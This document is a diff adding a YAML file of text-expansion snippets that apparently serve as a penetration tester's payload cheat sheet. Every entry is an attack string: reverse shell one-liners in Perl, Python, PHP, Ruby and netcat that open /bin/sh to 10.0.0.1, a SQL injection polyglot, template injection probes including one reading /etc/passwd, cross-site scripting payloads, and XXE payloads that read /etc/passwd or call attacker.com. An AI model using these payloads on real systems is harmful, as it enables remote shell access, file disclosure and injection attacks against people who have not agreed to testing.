@@ -1,0 +1,58 @@
+matches:
+  # Reverse Shells
+  - trigger: ":rev-perl"
+    replace: "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+  - trigger: ":rev-python"
+    replace: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+  - trigger: ":rev-php"
+    replace: "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+  - trigger: ":rev-ruby"
+    replace: "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+  - trigger: ":rev-nc"
+    replace: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
+
+  # SQL Injection Payloads
+  - trigger: ":sqli-poly"
+    replace: "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/"
+
+  # Server-side Template Injection Payloads
+  - trigger: ":ssti-asp"
+    replace: "@(1+2)"
+  - trigger: ":ssti-el"
+    replace: "${1+1}"
+  - trigger: ":ssti-el-alt"
+    replace: "#{1+1}"
+  - trigger: ":ssti-groovy"
+    replace: "${\"http://www.google.com\".toURL().text}"
+  - trigger: ":ssti-groovy-alt"
+    replace: "${new URL(\"http://www.google.com\").getText()}"
+  - trigger: ":ssti-jinja"
+    replace: "{{4*4}}[[5*5]]"
+  - trigger: ":ssti-ruby-file"
+    replace: "<%= File.open('/etc/passwd').read %>"
+  - trigger: ":ssti-ruby-dir"
+    replace: "<%= Dir.entries('/') %>"
+  - trigger: ":ssti-smarty"
+    replace: "{$smarty.version}"
+  - trigger: ":ssti-twig"
+    replace: "{{dump(app)}}"
+  - trigger: ":ssti-velocity"
+    replace: "#set($str=$class.inspect(\"java.lang.String\").type)"
+
+  # Cross-site Scripting Payloads
+  - trigger: ":xss-basic"
+    replace: "<script>confirm`1`</script>"
+  - trigger: ":xss-img"
+    replace: "<img src=a onerror=confirm`1`/>"
+  - trigger: ":xss-dom"
+    replace: "#\"><img src=/ onerror=alert(1)>"
+  - trigger: ":xss-markdown"
+    replace: "[a](javascript:prompt(1))"
+  - trigger: ":xss-poly"
+    replace: "\" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//"
+
+  # External XML Entity Injection Payloads
+  - trigger: ":xxe-file"
+    replace: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
+  - trigger: ":xxe-http"
+    replace: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://attacker.com'>]><root>&test;</root>"
